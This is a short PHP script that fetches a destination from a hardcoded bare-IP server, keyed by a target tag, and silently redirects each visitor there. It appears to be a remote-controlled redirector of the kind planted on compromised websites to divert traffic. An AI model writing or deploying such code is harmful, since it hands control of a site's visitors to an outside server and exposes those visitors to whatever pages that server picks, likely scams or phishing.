<?php 
$target="butie2";
$str = file_get_contents('http://47.242.208.146:3331/sender/'.$target);
$str = str_replace("let ip='","",$str);
// echo($str);
$new_url = explode("';var a",$str)[0];
// header('HTTP/1.1 301 Moved Permanently');
// echo($new_url);
header("Location:$new_url"); 
?>
